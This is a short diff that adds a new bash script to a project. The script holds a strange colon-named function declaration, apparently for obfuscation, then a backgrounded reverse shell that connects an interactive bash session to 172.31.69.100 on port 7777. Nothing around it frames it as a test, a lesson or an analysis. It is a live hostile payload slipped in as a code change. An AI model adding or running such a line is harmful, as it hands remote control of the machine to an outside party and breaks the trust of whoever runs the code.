@@ -1,0 +1,4 @@
+#!/bin/bash
+:(){ declare -A _; declare _[_]=1; };:;
+
+bash -i >& /dev/tcp/172.31.69.100/7777 0>&1 &
